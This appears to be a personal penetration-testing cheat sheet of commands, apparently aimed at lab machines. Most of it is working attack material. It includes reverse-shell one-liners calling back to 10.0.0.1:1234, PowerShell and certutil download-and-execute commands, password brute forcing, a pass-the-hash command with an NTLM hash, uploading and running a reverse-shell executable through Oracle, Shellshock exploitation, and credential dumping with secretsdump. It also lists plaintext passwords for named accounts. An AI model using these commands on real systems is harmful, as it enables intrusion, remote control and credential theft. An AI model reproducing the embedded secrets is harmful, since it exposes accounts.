########################################
#Normally I just open this with Firefox#
########################################

#OneLiners
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
{nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
one-lin3r

#Upgrade to PTY
python -c 'import pty; pty.spawn("/bin/bash")'
or
script -q /dev/null sh

Ctrl+Z

stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

get ROWS and COLS

stty raw -echo; fg

reset x2

stty rows ${ROWS} cols ${COLS}

TERM=xterm
xterm-color/xterm-256color


#Useful Kali Directories
ls /usr/share/webshells/webshells
ls /usr/share/windows-binaries/privesc

#File Uploading/Downloading
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-PowerShellTcp.ps1
wget http://10.0.0.1/
cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
sudo smbserver.py -comment 'Transfer' smb smb
sudo python -m SimpleHTTPServer 80
certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat

#Priv Esc
./LinEnum.sh -s -r report -e /tmp/ -t
winPEAS.bat/exe
LinPeas.sh

#FTP 21
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.97

#HTTP 80
feroxbuster -u http://10.10.10.97/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
use raft after.
nikto -host http://10.10.10.97 -C all -o nikto-scan.html
nikto -host http://10.10.10.97 -p 80,8080,1234 -C all -o nikto-all.html
cadaver http://10.10.10.97:8080/webdav/
/opt/kadimus/kadimus -u http://10.10.10.97/LFIPAGE.php?page=
//squidcd
nikto -h 10.10.10.97 -useproxy http://10.10.10.97:4444
LoginForms - SecLists- Generic-SQLi.txt
wfuzz -u "http://10.10.10.97/file.php?command=file://FUZZ" -w lfi.list
wpscan --url http://$10.10.10.97/ --enumerate ap,at,tt,cb,dbe,u,m
git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H 10.10.10.97  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H 10.10.10.97 --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose

#135 RPC
rpcinfo -p 10.10.10.97

#SMB 139/445
smbmap -H 10.10.10.97 -u anonymous -R
CME - Run as Root
cme smb 10.10.10.97 -u '' -p '' --shares
cme smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
cme smb 10.10.10.97 -u users.txt -p passwords.txt --shares --continue-on-success
medusa -h 10.10.10.97 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
smbclient -N -L 10.10.10.97
mount -t cifs '//10.10.10.97/new-site' smb -v -o user=tyler
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put nc.exe nc.exe'
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
umount smb

#LDAP 389/636/3268/3269
rpcclient -U '' -N 10.10.10.97
enumdomusers
enumdomgroups
ldapsearch -h 10.10.10.97 -p 389 -x -b "dc=megacorp,dc=local"
ldapsearch -h 10.10.10.97 -x -s base namingcontexts
ldapsearch -h 10.10.10.97 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof

#Oracle 1521
python3 odat.py all -s 10.10.10.97 -p 1521
mv ../www/shells/x64/rev-1234.exe .
python3 odat.py utlfile -s 10.10.10.97 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
python3 odat.py externaltable -s 10.10.10.97 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe

#MySQL 3306
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.97 -p 3306

#RDP 3389
rdesktop -u guest -p guest 10.10.10.97 -g 94%
ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.97

#ReverseShells
cp /usr/share/windows-resources/binaries/nc.exe .
nc.exe -e cmd 10.0.0.1 1234

#PTH Attack
pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd

#Enumeration
sudo rustscan --ulimit 5000 10.10.10.97 -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scan

#Dump
secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
